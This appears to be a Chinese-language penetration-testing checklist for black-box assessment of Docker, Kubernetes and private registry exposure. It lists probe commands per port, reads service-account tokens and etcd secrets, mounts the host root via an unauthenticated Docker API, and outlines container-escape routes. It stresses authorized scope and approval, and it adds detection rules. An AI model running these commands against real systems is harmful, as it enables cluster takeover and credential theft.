# 容器与 K8s 攻击面（黑盒视角）

> 定位：黑盒渗透中遇到的容器化资产（Docker/K8s/私有 registry）攻击面清单与验证姿势。
> 来源：开源容器安全测试方法论提炼改写（攻击视角）+ 通用实战知识。
> 纪律：容器逃逸与集群横向属高危动作——**验证存在性拿证据即止**，逃逸利用在授权范围内
> 且经用户批准后进行；发现即按 finding 六字段报告。

## 1. 暴露端口速查（侦察阶段指纹）

| 端口 | 服务 | 常见暴露形态 | 一发验证 |
|---|---|---|---|
| 2375/2376 | Docker Engine API | 调试/内网误暴露（2376 或带 TLS） | `curl http://<ip>:2375/version` 返回 JSON 即未授权 |
| 10248/10249 | kubelet healthz/port-stats | 节点面 | `curl http://<ip>:10248/healthz` → ok |
| 10250 | kubelet API（exec/logs） | 云节点/误配 | `curl -k https://<ip>:10250/pods` 匿名 200 = 严重 |
| 10255 | kubelet read-only | 老版本 | `curl http://<ip>:10255/pods` |
| 2379/2380 | etcd | 集群控制面 | `curl http://<ip>:2379/v2/keys/` 无鉴权 = 集群沦陷级 |
| 5000 | Docker Registry v2 | 私有仓库 | `curl http://<ip>:5000/v2/_catalog` 列镜像 |
| 30000-32767 | NodePort | 任意 svc | 按指纹逐个验 |
| 6443 | kube-apiserver | 证书/匿名误配 | `curl -k https://<ip>:6443/version`（401/403 正常，200+版本=查匿名） |
| 8001/8080 | kubectl proxy/dashboard | 误开 proxy | `curl http://<ip>:8001/api/v1/namespaces` |
| 10256 | kube-proxy healthz | — | 指纹辅助 |

nmap 服务识别：`nmap -sV -p 2375,2376,2379,2380,5000,6443,8001,8080,10248-10256,30000-32767 <ip>`。

## 2. Docker API 未授权（2375）

```bash
curl http://<ip>:2375/version          # 版本指纹（登记证据）
curl http://<ip>:2375/containers/json  # 运行容器清单
# 逃逸验证（授权内！）：挂载宿主根启动特权容器 = 影响证明级证据，须先获批准
docker -H tcp://<ip>:2375 run --rm -v /:/host alpine ls /host
```
影响定级：未授权 Docker API = 直接宿主 RCE（高危）。

## 3. kubelet 10250 → 节点执行

```bash
curl -k https://<ip>:10250/pods                 # 匿名可读 = pod 清据 + serviceAccount token 路径
curl -k https://<ip>:10250/runningpods/
# 在授权范围内：通过 exec 接口执行命令（携带匿名凭据）
kubectl --kubeconfig <(echo "apiVersion: v1...") auth can-i --list  # 若有凭据
```
只读验证顺序：`/pods` → `/runningpods/` → `/metrics`；exec 利用前问用户。

## 4. 拿到 Pod 内 shell 后（K8s 场景标准动作）

```bash
# 服务账户凭据与环境
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace   # 所在 ns
cat /var/run/secrets/kubernetes.io/serviceaccount/token       # JWT（登记，勿外传）
ls /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
env | grep -i kube
# 用 token 探权限（决定横向面）
kubectl --token=<jwt> --server=https://<api>:6443 --insecure-skip-tls-verify auth can-i --list
kubectl --token=<jwt> -n <ns> get pods,secrets,configmaps     # 常见提权起点：可读 secret
```
SA token 的威力取决于 RBAC：`can-i` 输出直接决定下一步（create pod → 挂载 node 路径逃逸；
read secrets → 拿其他凭据）。

## 5. K8s 配置型弱点（ apiserver 视角）

- 匿名/`--anonymous-auth=true` + ABAC allow-all：`curl -k https://<api>:6443/api/v1/nodes`
- dashboard 未鉴权（旧版 8080/UI）：直接进入容器 exec
- etcd 无鉴权（2379）：读 `/"registry/secrets"` 全集群秘密——发现即高危证据
- 挂载敏感 hostPath（`/`、`/proc`、`/var/run/docker.sock`）的 Pod 定义：
  `kubectl get pods -o yaml | grep -A3 hostPath`
- privileged / hostPID / hostNetwork: true 的 Pod = 节点级立足点候选

## 6. 容器镜像供应链（registry 5000）

```bash
curl http://<ip>:5000/v2/_catalog                    # 镜像名清单
curl http://<ip>:5000/v2/<name>/tags/list            # 标签
# 拉取分析（找内嵌凭据/源码/.env）：
docker pull <ip>:5000/<name>:<tag> && docker history/saves 或 dive 分析层
trivy image <ip>:5000/<name>:<tag>                    # CVE + secret 扫描（已装时）
```

## 7. 容器逃逸检查面（发现高危配置后的"存在性验证"）

- privileged 容器：`cat /proc/self/status | grep CapEff`（CapEff 0000003fffffffff ≈ 全能力）→ `nsenter`/release_agent 只作存在性说明，实际逃逸执行须批准
- 挂载 docker.sock：`ls -l /var/run/docker.sock` → 可控镜像即宿主 RCE（证据：sock 存在 + docker version 通）
- 内核漏洞逃逸（dirty cow / CVE-2019-5736 runc 等）：报告受影响版本指纹（uname -a + runc --version），利用另走批准

## 8. 防守侧对应（detection gap 交 attack-defense）

容器逃逸检测面：auditd execve in ns、Falco 规则（privileged container spawned / docker sock mount）、
K8s audit log（exec into pod / secret get）。评估时供防御验证员对照。

## 与生态的分工

- 容器**逃逸利用链验证**超出黑盒镜头时 → attack-defense 收口
- 镜像内的应用漏洞 → 源码可得时交 code-audit（image dump 后）
- K8s 集群攻击路径完整评估（多节点横向）→ attack-defense 主镜头
